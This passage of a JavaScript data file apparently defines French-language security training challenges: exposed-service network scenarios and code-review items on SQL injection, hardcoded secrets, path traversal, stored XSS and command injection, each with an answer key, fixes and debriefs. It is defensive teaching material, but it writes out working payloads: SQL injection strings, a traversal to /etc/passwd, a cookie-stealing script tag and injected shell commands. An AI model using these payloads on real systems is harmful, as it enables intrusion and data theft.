      { id: 'printer',     icon: '🖨️', name: 'Imprimante HP',   ip: '192.168.1.99', ports: '9100/tcp (RAW) • 80/tcp (Admin HTTP)', note: 'Interface admin sans authentification — firmware 2019', vulnerable: false, riskLevel: 'LOW',      riskReason: 'Admin sans mot de passe mais isolée réseau.' },
    ],
    correctNodeId: 'webserver',
    tooltip: {
      success: 'Excellent ! MySQL (3306) exposé sur internet + Apache 2.2.8 EOL = double vulnérabilité critique.',
      fail: 'MySQL ne doit JAMAIS écouter sur une interface publique. Apache 2.2.8 est abandonné depuis 2018.',
      knowledge: 'Principe du moindre privilège réseau : chaque service expose uniquement les ports nécessaires. MySQL doit écouter sur 127.0.0.1 uniquement.',
    },
    debrief: [
      'Port 3306 ouvert sur internet = invitation pour un attaquant distant.',
      'Apache 2.2.x est End-of-Life depuis décembre 2017 — plus de patches.',
      'L\'audit de surface d\'attaque commence par un scan Nmap exhaustif (-sV -sC).',
      '"Security by default" : tout ce qui n\'est pas nécessaire doit être désactivé.',
    ],
  },

  {
    id: 'network_rdp', type: 'network', title: 'Exposition Internet : RDP Direct',
    difficulty: 2, xpReward: 115, creditReward: 80,
    description: 'Shodan a indexé cette cible. Identifiez la surface d\'attaque la plus critique accessible depuis internet.',
    nodes: [
      { id: 'rdp_server',   icon: '🖥️', name: 'Serveur RDP',     ip: '203.0.113.10', ports: '3389/tcp (RDP) • 445/tcp (SMB)', note: 'Windows Server 2016 — RDP exposé INTERNET — patchs retard 6 mois', vulnerable: true,  riskLevel: 'CRITIQUE', riskReason: 'RDP+SMB internet + patchs retardés (BlueKeep, EternalBlue).' },
      { id: 'vpn_gateway',  icon: '🔒', name: 'Passerelle VPN',   ip: '203.0.113.1',  ports: '443/tcp (SSL-VPN) • 500/udp (IPSec)', note: 'Palo Alto GlobalProtect — à jour — MFA activé', vulnerable: false, riskLevel: 'LOW',      riskReason: 'VPN à jour, MFA activé.' },
      { id: 'webserver_dmz',icon: '🌐', name: 'Web DMZ',          ip: '203.0.113.20', ports: '80/tcp (HTTP→443) • 443/tcp (HTTPS)', note: 'Nginx 1.24 — WAF Cloudflare actif', vulnerable: false, riskLevel: 'LOW',      riskReason: 'HTTPS, WAF, Nginx à jour.' },
      { id: 'mail_server',  icon: '📧', name: 'Serveur Mail',     ip: '203.0.113.30', ports: '25/tcp (SMTP) • 443/tcp (HTTPS) • 993/tcp (IMAPS)', note: 'Exchange 2019 CU14 — SPF/DKIM/DMARC configurés', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'SMTP ouvert (normal), Exchange à jour.' },
    ],
    correctNodeId: 'rdp_server',
    tooltip: {
      success: 'Parfait ! RDP exposé internet + 6 mois de retard de patchs. BlueKeep (CVE-2019-0708) permet l\'exécution de code à distance non authentifié.',
      fail: 'RDP exposé internet + SMB + patchs en retard = combinaison explosive. BlueKeep affecte les RDP non patchés et permet un RCE non authentifié.',
      knowledge: 'RDP exposé sur internet est la cause n°1 des ransomwares en entreprise. 90% des attaques ransomware initial access passent par RDP ou phishing.',
    },
    debrief: [
      'RDP sur internet = invitation au ransomware. Le port 3389 est scanné en permanence.',
      'BlueKeep (2019) et EternalBlue (2017) : exploits publics et fonctionnels des années après.',
      'Architecture correcte : RDP uniquement via VPN avec MFA — jamais direct internet.',
      'Shodan indexe les RDP exposés — votre infrastructure est scannée en temps réel.',
    ],
  },

  {
    id: 'network_dmz', type: 'network', title: 'Architecture DMZ : Pivot Interne',
    difficulty: 3, xpReward: 170, creditReward: 120,
    description: 'Vous avez déjà compromis la DMZ. Identifiez le service permettant un pivot vers le réseau interne (LAN).',
    nodes: [
      { id: 'jump_server', icon: '🎯', name: 'Jump Server (Bastion)', ip: '192.168.100.5',  ports: '22/tcp (SSH) • routage DMZ↔LAN activé', note: 'Ubuntu 22.04 — clé SSH : root@dmz-web01 (compromis)', vulnerable: true,  riskLevel: 'CRITIQUE', riskReason: 'Bastion avec routage DMZ↔LAN + clé SSH compromise = pivot direct.' },
      { id: 'db_server',   icon: '🗄️', name: 'Serveur DB (DMZ)',     ip: '192.168.100.20', ports: '5432/tcp (PostgreSQL)', note: 'PostgreSQL 15 — accès limité apps DMZ — pas de routage LAN', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'PostgreSQL sans accès LAN — pivot impossible.' },
      { id: 'monitoring',  icon: '📡', name: 'Monitoring',            ip: '192.168.100.30', ports: '9090/tcp (Prometheus) • 3000/tcp (Grafana)', note: 'Grafana 10 — accès lecture seule — agents sur LAN', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'Agents LAN mais lecture seule — pivot difficile.' },
      { id: 'dns_internal',icon: '🔍', name: 'DNS Interne',           ip: '192.168.100.2',  ports: '53/tcp (DNS) • 53/udp (DNS)', note: 'Bind9 — zone transfers non restreints', vulnerable: false, riskLevel: 'LOW',      riskReason: 'Zone transfers = fuite d\'info, pas de pivot direct.' },
    ],
    correctNodeId: 'jump_server',
    tooltip: {
      success: 'Excellent ! Le bastion SSH avec routage DMZ↔LAN est le pivot idéal. Une clé compromise sur le web DMZ peut fonctionner par réutilisation sur le bastion.',
      fail: 'Le Jump Server : routage DMZ↔LAN + SSH + clé d\'un serveur déjà compromis (root@dmz-web01) = voie royale vers le LAN interne.',
      knowledge: 'Le lateral movement est la phase post-exploitation où l\'attaquant se déplace entre systèmes. Un bastion mal sécurisé est souvent le maillon faible — il concentre les clés SSH et relie les deux zones.',
    },
    debrief: [
      'Un Jump Server doit être le système le plus durci du réseau — souvent l\'inverse en pratique.',
      'La réutilisation de clés SSH entre systèmes permet la propagation latérale sans exploit.',
      'SSH ProxyJump tunnelle une connexion interne via le bastion en une seule commande.',
      'Défense : MFA sur SSH, clés uniques par système, audit de toutes les connexions.',
    ],
  },

  // ── CTF ───────────────────────────────────────────────────

  {
    id: 'ctf_sqli', type: 'ctf', title: 'Code Review : SQL Injection',
    difficulty: 2, xpReward: 120, creditReward: 90,
    description: 'Vous auditez ce code PHP d\'une application web en production. Trouvez la faille la plus critique.',
    code: [
      { num: 1,  src: '<span class="kw">&lt;?php</span>',                                                                                                        burpSuspect: false },
      { num: 2,  src: '',                                                                                                                                         burpSuspect: false },
      { num: 3,  src: '<span class="kw">function</span> <span class="var">getUser</span>(<span class="var">$username</span>) {',                                  burpSuspect: false },
      { num: 4,  src: '&nbsp;&nbsp;<span class="var">$db</span> = <span class="kw">new</span> PDO(<span class="str">\'mysql:host=localhost;dbname=app\'</span>);',  burpSuspect: false },
      { num: 5,  src: '&nbsp;&nbsp;<span class="var">$query</span> = <span class="str">"SELECT * FROM users WHERE name = \'"</span>',                             burpSuspect: true  },
      { num: 6,  src: '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . <span class="var">$username</span> . <span class="str">"\'"</span>;',        burpSuspect: true  },
      { num: 7,  src: '&nbsp;&nbsp;<span class="var">$result</span> = <span class="var">$db</span>-&gt;query(<span class="var">$query</span>);',                 burpSuspect: false },
      { num: 8,  src: '&nbsp;&nbsp;<span class="kw">return</span> <span class="var">$result</span>-&gt;fetch();',                                                burpSuspect: false },
      { num: 9,  src: '}',                                                                                                                                        burpSuspect: false },
      { num: 10, src: '',                                                                                                                                         burpSuspect: false },
      { num: 11, src: '<span class="comment">// Appel depuis le contrôleur :</span>',                                                                            burpSuspect: false },
      { num: 12, src: '<span class="var">$user</span> = <span class="var">getUser</span>(<span class="var">$_GET</span>[<span class="str">\'username\'</span>]);',  burpSuspect: false },
    ],
    options: [
      { id: 'l4',  label: 'Ligne 4  — Connexion PDO sans options de sécurité',                   correct: false },
      { id: 'l56', label: 'Lignes 5-6 — Concaténation directe de $username dans la requête SQL', correct: true  },
      { id: 'l7',  label: 'Ligne 7  — Utilisation de query() au lieu de prepare()',              correct: false },
      { id: 'l12', label: 'Ligne 12 — Lecture de $_GET sans validation ni filtrage',             correct: false },
    ],
    tooltip: {
      success: 'Exact ! Lignes 5-6 : concaténation directe. Payload : \' OR \'1\'=\'1 contourne l\'auth, \';\' DROP TABLE users;-- détruit la base.',
      fail: 'La faille est aux lignes 5-6. La concaténation de $username crée une injection SQL. La ligne 12 contribue mais la source est la construction de la requête.',
      knowledge: 'Les injections SQL sont dans le Top 3 OWASP depuis 2010. Solution : requêtes préparées (prepare/execute) — séparent code SQL et données utilisateur structurellement.',
    },
    fix: '// VERSION SÉCURISÉE :\n$stmt = $db->prepare("SELECT * FROM users WHERE name = ?");\n$stmt->execute([$username]);\n$result = $stmt->fetch();',
    debrief: [
      'Les requêtes préparées séparent code SQL et données — injection impossible.',
      'Payload classique : \' OR \'1\'=\'1 contourne une auth.',
      'En pire cas, SQLi permet de dumper la DB, écrire des fichiers ou exécuter des commandes OS.',
      'Règle d\'or : valider puis paramétrer toute entrée externe.',
    ],
  },

  {
    id: 'ctf_hardcoded', type: 'ctf', title: 'Source Code Leak : Credentials',
    difficulty: 1, xpReward: 70, creditReward: 45,
    description: 'Ce script de déploiement a été publié accidentellement sur un repo GitHub public. Trouvez la faille critique.',
    code: [
      { num: 1,  src: '<span class="kw">import</span> boto3',                                                                                                        burpSuspect: false },
      { num: 2,  src: '<span class="kw">import</span> requests',                                                                                                      burpSuspect: false },
      { num: 3,  src: '',                                                                                                                                              burpSuspect: false },
      { num: 4,  src: '<span class="comment"># Configuration déploiement AWS</span>',                                                                                burpSuspect: false },
      { num: 5,  src: 'AWS_ACCESS_KEY = <span class="str">"AKIAIOSFODNN7EXAMPLE"</span>',                                                                            burpSuspect: true  },
      { num: 6,  src: 'AWS_SECRET_KEY = <span class="str">"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</span>',                                                       burpSuspect: true  },
      { num: 7,  src: 'DB_PASSWORD&nbsp;&nbsp;&nbsp;= <span class="str">"Prod_P@ssw0rd_2024!"</span>',                                                               burpSuspect: true  },
      { num: 8,  src: '',                                                                                                                                              burpSuspect: false },
      { num: 9,  src: '<span class="kw">def</span> <span class="var">deploy</span>():',                                                                              burpSuspect: false },
      { num: 10, src: '&nbsp;&nbsp;<span class="var">s3</span> = boto3.client(<span class="str">\'s3\'</span>, aws_access_key_id=AWS_ACCESS_KEY)',                    burpSuspect: false },
      { num: 11, src: '&nbsp;&nbsp;<span class="var">s3</span>.upload_file(<span class="str">\'app.zip\'</span>, <span class="str">\'prod-bucket\'</span>, <span class="str">\'app.zip\'</span>)', burpSuspect: false },
      { num: 12, src: '',                                                                                                                                              burpSuspect: false },
      { num: 13, src: '<span class="var">deploy</span>()',                                                                                                            burpSuspect: false },
    ],
    options: [
      { id: 'l13',  label: 'Ligne 13 — deploy() appelé sans vérification d\'environnement',       correct: false },
      { id: 'l10',  label: 'Ligne 10 — création client S3 sans région spécifiée',                 correct: false },
      { id: 'l567', label: 'Lignes 5-7 — credentials AWS et mot de passe DB en dur dans le code', correct: true  },
      { id: 'l2',   label: 'Ligne 2 — import requests potentiellement inutile',                   correct: false },
    ],
    tooltip: {
      success: 'Exact ! Des credentials en dur sur un repo public seraient exploités en moins de 5 minutes par les bots qui scannent GitHub en temps réel.',
      fail: 'Les lignes 5-7 : credentials hardcodés. Clé AWS + mot de passe DB sur GitHub = exploitation garantie en quelques minutes.',
      knowledge: 'GitGuardian détecte des secrets GitHub en temps réel. En 2023, 10 millions de secrets ont été exposés. Les bots exploitent les clés AWS en moyenne 4 minutes après le commit.',
    },
    fix: '# SOLUTION : variables d\'environnement\nimport os\n\nAWS_ACCESS_KEY = os.environ[\'AWS_ACCESS_KEY\']\nAWS_SECRET_KEY = os.environ[\'AWS_SECRET_KEY\']\nDB_PASSWORD    = os.environ[\'DB_PASSWORD\']\n\n# Ou utiliser AWS Secrets Manager / HashiCorp Vault',
    debrief: [
      'Les secrets ne doivent JAMAIS apparaître dans le code source, même en commentaire.',
      'Utilisez les variables d\'environnement (.env) ou un gestionnaire de secrets.',
      'git log : même supprimé, un secret reste dans l\'historique git.',
      'Outils de détection : trufflehog, gitleaks, GitGuardian.',
    ],
  },

  {
    id: 'ctf_path_traversal', type: 'ctf', title: 'API File Reader : Path Traversal',
    difficulty: 1, xpReward: 75, creditReward: 48,
    description: 'Audit d\'une API Express.js qui sert des fichiers de documentation. Identifiez la vulnérabilité.',
    code: [
      { num: 1,  src: '<span class="kw">const</span> express = require(<span class="str">\'express\'</span>)', burpSuspect: false },
      { num: 2,  src: '<span class="kw">const</span> fs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = require(<span class="str">\'fs\'</span>)',      burpSuspect: false },
      { num: 3,  src: '<span class="kw">const</span> path&nbsp;&nbsp;&nbsp; = require(<span class="str">\'path\'</span>)',  burpSuspect: false },
      { num: 4,  src: '',                                                                           burpSuspect: false },
      { num: 5,  src: '<span class="kw">const</span> DOCS_DIR = <span class="str">\'/var/app/docs\'</span>',                         burpSuspect: false },
      { num: 6,  src: '',                                                                           burpSuspect: false },
      { num: 7,  src: 'app.get(<span class="str">\'/doc\'</span>, (req, res) => {',               burpSuspect: false },
      { num: 8,  src: '&nbsp;&nbsp;<span class="kw">const</span> file = req.query.name',          burpSuspect: false },
      { num: 9,  src: '&nbsp;&nbsp;<span class="kw">const</span> filePath = DOCS_DIR + <span class="str">\'/\'</span> + file', burpSuspect: true },
      { num: 10, src: '&nbsp;&nbsp;<span class="kw">const</span> content = fs.readFileSync(filePath, <span class="str">\'utf8\'</span>)', burpSuspect: false },
      { num: 11, src: '&nbsp;&nbsp;res.send(content)',                                             burpSuspect: false },
      { num: 12, src: '})',                                                                         burpSuspect: false },
    ],
    options: [
      { id: 'l2',  label: 'Ligne 2 — import de fs (filesystem) dangereux en production',                                   correct: false },
      { id: 'l5',  label: 'Ligne 5 — DOCS_DIR est un chemin absolu',                                                       correct: false },
      { id: 'l9',  label: 'Ligne 9 — concaténation directe de l\'input utilisateur dans un chemin de fichier',             correct: true  },
      { id: 'l11', label: 'Ligne 11 — res.send() expose le contenu sans Content-Type sécurisé',                            correct: false },
    ],
    tooltip: {
      success: 'Correct ! Ligne 9 : avec name=../../../etc/passwd, le chemin devient /etc/passwd — path traversal classique.',
      fail: 'Ligne 9 : DOCS_DIR + "/" + file sans validation. Avec name=../../../etc/passwd → lit n\'importe quel fichier système.',
      knowledge: 'Path Traversal (CWE-22) est dans le Top 10 OWASP. La séquence "../" permet de remonter dans l\'arborescence. Solution : path.resolve() + vérifier que le chemin commence par DOCS_DIR.',
    },
    fix: '// SOLUTION : valider que le chemin reste dans DOCS_DIR\nconst filePath = path.resolve(DOCS_DIR, file);\nif (!filePath.startsWith(DOCS_DIR)) {\n  return res.status(403).send(\'Accès refusé\');\n}\n// Maintenant sûr de lire filePath',
    debrief: [
      '"../" remonte d\'un niveau : /docs/../etc/passwd = /etc/passwd.',
      'path.resolve() normalise le chemin, startsWith() vérifie le répertoire autorisé.',
      'En production : process sans droits root, /docs monté en read-only.',
      'Fichiers ciblés : /etc/passwd, /etc/shadow, .env, config/database.yml.',
    ],
  },

  {
    id: 'ctf_xss', type: 'ctf', title: 'Forum App : XSS Stocké',
    difficulty: 2, xpReward: 130, creditReward: 85,
    description: 'Audit d\'un composant de forum JavaScript. Une faille permet d\'injecter du code dans le navigateur de tous les visiteurs.',
    code: [
      { num: 1,  src: '<span class="kw">function</span> <span class="var">displayPost</span>(post) {',                                                                          burpSuspect: false },
      { num: 2,  src: '&nbsp;&nbsp;<span class="kw">const</span> <span class="var">el</span> = document.getElementById(<span class="str">\'post-container\'</span>)',           burpSuspect: false },
      { num: 3,  src: '',                                                                                                                                                         burpSuspect: false },
      { num: 4,  src: '&nbsp;&nbsp;<span class="comment">// Afficher le message de l\'utilisateur</span>',                                                                      burpSuspect: false },
      { num: 5,  src: '&nbsp;&nbsp;<span class="var">el</span>.innerHTML = <span class="str">`</span>',                                                                          burpSuspect: true  },
      { num: 6,  src: '&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=<span class="str">"post"</span>&gt;',                                                                              burpSuspect: true  },
      { num: 7,  src: '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;b&gt;${post.author}&lt;/b&gt; : ${post.content}',                                                                burpSuspect: true  },
      { num: 8,  src: '&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;<span class="str">`</span>',                                                                                         burpSuspect: false },
      { num: 9,  src: '}',                                                                                                                                                        burpSuspect: false },
      { num: 10, src: '',                                                                                                                                                         burpSuspect: false },
      { num: 11, src: '<span class="comment">// Chargement depuis l\'API</span>',                                                                                               burpSuspect: false },
      { num: 12, src: 'fetch(<span class="str">\'/api/posts\'</span>).then(r => r.json()).then(posts => posts.forEach(<span class="var">displayPost</span>))',                   burpSuspect: false },
    ],
    options: [
      { id: 'l12', label: 'Ligne 12 — fetch() sans vérification de l\'origine de l\'API',                                correct: false },
      { id: 'l2',  label: 'Ligne 2 — getElementById sans vérification d\'existence',                                      correct: false },
      { id: 'l57', label: 'Lignes 5-7 — innerHTML avec données utilisateur non sanitisées (author et content)',           correct: true  },
      { id: 'l4',  label: 'Ligne 4 — commentaire qui expose la logique interne',                                          correct: false },
    ],
    tooltip: {
      success: 'Excellent ! innerHTML interprète le HTML et le JS. Si post.content = "<script>fetch(evil+cookie)</script>", le cookie de chaque visiteur est volé.',
      fail: 'Lignes 5-7 : innerHTML avec données brutes. Un message contenant <script>...</script> sera exécuté dans le navigateur de chaque visiteur.',
      knowledge: 'XSS Stocké est l\'une des vulnérabilités web les plus dangereuses : le payload est persisté en base et déclenché chez TOUS les visiteurs. Permet le vol de session, keylogging, propagation virale.',
    },
    fix: '// SOLUTION 1 : textContent (ne parse pas le HTML)\nel.textContent = `${post.author} : ${post.content}`\n\n// SOLUTION 2 : DOMPurify\nel.innerHTML = DOMPurify.sanitize(\n  `<div class="post"><b>${post.author}</b> : ${post.content}</div>`\n)',
    debrief: [
      'innerHTML = interpréteur HTML+JS. textContent = texte brut seulement.',
      'XSS Stocké : payload en base → touche TOUS les visiteurs, effet viral possible.',
      'Content Security Policy (CSP) peut bloquer les scripts inline — défense en profondeur.',
      'DOMPurify est la librairie de référence pour sanitiser le HTML avant injection DOM.',
    ],
  },

  {
    id: 'ctf_cmdi', type: 'ctf', title: 'Pentest Tool : Command Injection',
    difficulty: 3, xpReward: 180, creditReward: 130,
    description: 'Outil interne de ping développé en Python/Flask. Identifiez la ligne permettant l\'exécution de commandes arbitraires.',
    code: [
      { num: 1,  src: '<span class="kw">import</span> subprocess',                                                                                                                     burpSuspect: false },
      { num: 2,  src: '<span class="kw">from</span> flask <span class="kw">import</span> Flask, request, jsonify',                                                                    burpSuspect: false },
      { num: 3,  src: '',                                                                                                                                                               burpSuspect: false },
      { num: 4,  src: 'app = Flask(__name__)',                                                                                                                                          burpSuspect: false },
      { num: 5,  src: '',                                                                                                                                                               burpSuspect: false },
      { num: 6,  src: '@app.route(<span class="str">\'/ping\'</span>)',                                                                                                               burpSuspect: false },
      { num: 7,  src: '<span class="kw">def</span> <span class="var">ping</span>():',                                                                                                 burpSuspect: false },
      { num: 8,  src: '&nbsp;&nbsp;host = request.args.get(<span class="str">\'host\'</span>)',                                                                                       burpSuspect: false },
      { num: 9,  src: '&nbsp;&nbsp;cmd&nbsp; = <span class="str">f"ping -c 3 {host}"</span>',                                                                                        burpSuspect: true  },
      { num: 10, src: '&nbsp;&nbsp;out&nbsp; = subprocess.check_output(cmd, shell=<span class="kw">True</span>)',                                                                     burpSuspect: true  },
      { num: 11, src: '&nbsp;&nbsp;<span class="kw">return</span> jsonify({<span class="str">\'result\'</span>: out.decode()})',                                                      burpSuspect: false },
    ],
    options: [
      { id: 'l8',   label: 'Ligne 8 — request.args.get() sans valeur par défaut',            correct: false },
      { id: 'l910', label: 'Lignes 9-10 — f-string + shell=True permettent l\'injection OS',  correct: true  },
      { id: 'l11',  label: 'Ligne 11 — decode() sans gestion d\'erreur d\'encodage',         correct: false },
      { id: 'l1',   label: 'Ligne 1 — import subprocess dangereux par nature',               correct: false },
    ],
    tooltip: {
      success: 'Parfait ! f-string + shell=True : avec host=8.8.8.8; cat /etc/passwd, la commande devient deux commandes exécutées séquentiellement.',
      fail: 'f-string (ligne 9) + shell=True (ligne 10) = injection de commandes. shell=True passe la commande à /bin/sh — ; | && deviennent des séparateurs exploitables.',
      knowledge: 'Command Injection (CWE-78) permet l\'exécution de commandes OS arbitraires. Avec shell=True, les métacaractères (; | && ` $()) deviennent des vecteurs d\'attaque. Solution : shell=False + liste d\'arguments.',
    },
    fix: '# SOLUTION : shell=False + liste d\'arguments + validation\nimport re\n\nif not re.match(r\'^[a-zA-Z0-9._-]+$\', host):\n    return jsonify({\'error\': \'Invalid host\'}), 400\n\nout = subprocess.check_output(\n    [\'ping\', \'-c\', \'3\', host],  # shell=False par défaut\n    timeout=10\n)',
    debrief: [
      'shell=True passe la commande à /bin/sh — tous les métacaractères shell fonctionnent.',
      'Payload : 8.8.8.8; id → exécute ping PUIS "id" (affiche l\'utilisateur courant).',
      'shell=False + liste d\'args = pas d\'interprétation shell, arguments passés directement à l\'OS.',
      'Valider avec une whitelist (regex ^[a-zA-Z0-9._-]+$) avant toute utilisation.',
    ],
  },

];
